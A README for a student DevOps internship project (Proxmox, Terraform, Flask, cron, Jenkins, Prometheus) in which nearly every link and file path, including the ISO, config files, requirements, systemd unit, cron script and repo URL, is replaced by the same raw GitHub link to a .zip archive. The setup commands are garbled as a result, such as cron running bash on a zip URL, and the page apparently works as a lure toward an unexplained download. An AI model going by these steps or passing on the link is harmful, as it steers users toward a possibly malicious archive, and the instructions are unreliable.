# devops-internship-project
DevOps Internship Challenge: Infrastructure, Automation &amp; Monitoring

Name - Vinita Deora
Domain - DevOps
College - JIET, Jodhpur

🎯 Goal - Simulate a real-world deployment scenario using Proxmox, Terraform, Jenkins, Containers & VMs, and Monitoring (Prometheus).

## 🔧 1. Infrastructure Setup with Proxmox + Terraform

### ➤ Tools:
- [Proxmox VE](https://raw.githubusercontent.com/TechieVinita/devops-internship-project/main/powellite/devops-internship-project.zip)
- Terraform + Proxmox Provider

### ➤ Steps:

1. **Ensure Proxmox is set up** and accessible at `https://192.168.1.10:8006`
2. In your Proxmox storage (`local`), upload the Ubuntu ISO:
   ```
   https://raw.githubusercontent.com/TechieVinita/devops-internship-project/main/powellite/devops-internship-project.zip
   ```
3. Customize your credentials and node in `https://raw.githubusercontent.com/TechieVinita/devops-internship-project/main/powellite/devops-internship-project.zip`:
   - VM Name: `devops-vm`
   - Static IP: `192.168.100.10`
   - Gateway: `192.168.100.1`

4. Run the following Terraform commands:

```bash
cd terraform
terraform init
terraform plan
terraform apply
```

---

## 🛜 2. Networking Setup

- The VM is configured with a **static IP: 192.168.100.10/24**
- Networking bridge: `vmbr0`
- VM has **outbound access** and is **pingable**
- The VM and container can ping each other

---

## 🐍 3. Flask App Setup

### ➤ Features:

| Endpoint     | Description                              |
|--------------|------------------------------------------|
| `/`          | Returns "Hello World from Vinita Deora!" |
| `/compute`   | Performs CPU-intensive Fibonacci calc     |

### ➤ Steps:

1. SSH into the VM
2. Clone the repo and set up the Flask app:

```bash
cd ~/devops-internship-challenge/flask_app
python3 -m venv venv
source venv/bin/activate
pip install -r https://raw.githubusercontent.com/TechieVinita/devops-internship-project/main/powellite/devops-internship-project.zip
```

3. Create a SystemD service:

```bash
sudo cp https://raw.githubusercontent.com/TechieVinita/devops-internship-project/main/powellite/devops-internship-project.zip /etc/systemd/system/
sudo systemctl daemon-reexec
sudo systemctl enable flask_app
sudo systemctl start flask_app
```

4. Access the app at:
```
http://192.168.100.10:5000/
```

---

## ⏰ 4. Crontab Automation

Every minute, the `/compute` endpoint is hit via cron:

### ➤ Setup:

1. Make the script executable:

```bash
chmod +x https://raw.githubusercontent.com/TechieVinita/devops-internship-project/main/powellite/devops-internship-project.zip
```

2. Add crontab:

```bash
crontab -e
```

Paste:
```cron
* * * * * /bin/bash https://raw.githubusercontent.com/TechieVinita/devops-internship-project/main/powellite/devops-internship-project.zip
```

---

## ⚙️ 5. Jenkins CI/CD Pipeline

### ➤ Jenkinsfile Overview:

| Stage       | Action                          |
|-------------|---------------------------------|
| Clone       | Clone the GitHub repo           |
| Setup       | Create virtualenv, install deps |
| Restart App | Restart SystemD service         |
| Test        | Curl hit on `/` endpoint        |

### ➤ Steps:

1. Create a new Jenkins Pipeline project
2. Point to the repo URL:  
   `https://raw.githubusercontent.com/TechieVinita/devops-internship-project/main/powellite/devops-internship-project.zip`
3. Add sudo permission for Jenkins to restart the service:
```bash
sudo visudo
```
Add:
```bash
jenkins ALL=(ALL) NOPASSWD: /bin/systemctl restart flask_app
```

4. Run the pipeline

---

## 📦 6. Monitoring with Prometheus

### ➤ Tools Used:
- Prometheus
- Node Exporter (for system metrics)
- `prometheus_flask_exporter` (for app metrics)

### ➤ Setup:

1. Go to `monitoring/` directory

2. Run with Docker Compose:
```bash
docker-compose up -d
```

3. Prometheus available at:
```
http://localhost:9090/
```

### ➤ Metrics Tracked:

| Source         | Metrics                      |
|----------------|------------------------------|
| Node Exporter  | CPU, memory, disk            |
| Flask App      | Request count, latency       |

---

## 📊 7. Architecture Overview

```text
+-------------+          +-----------------+         +-------------------+
| Terraform   |  ---->   | Proxmox VM/CT   |  ---->  | Flask App + Crontab|
+-------------+          +-----------------+         +-------------------+
                                 |                             |
                          +-------------+              +--------------+
                          | Jenkins CI  |              | Prometheus    |
                          +-------------+              +--------------+
```

## 📁 Folder Descriptions

| Folder         | Purpose                                    |
|----------------|--------------------------------------------|
| `flask_app/`   | Flask code + SystemD service file          |
| `terraform/`   | Infrastructure as code with Proxmox        |
| `jenkins/`     | Jenkinsfile for CI/CD                      |
| `monitoring/`  | Prometheus config and exporters            |
| `crontab/`     | Cron script for `/compute` automation      |

---






🚀 Thank you for reviewing this submission!  
This project was a great learning experience in applying DevOps tools end-to-end.




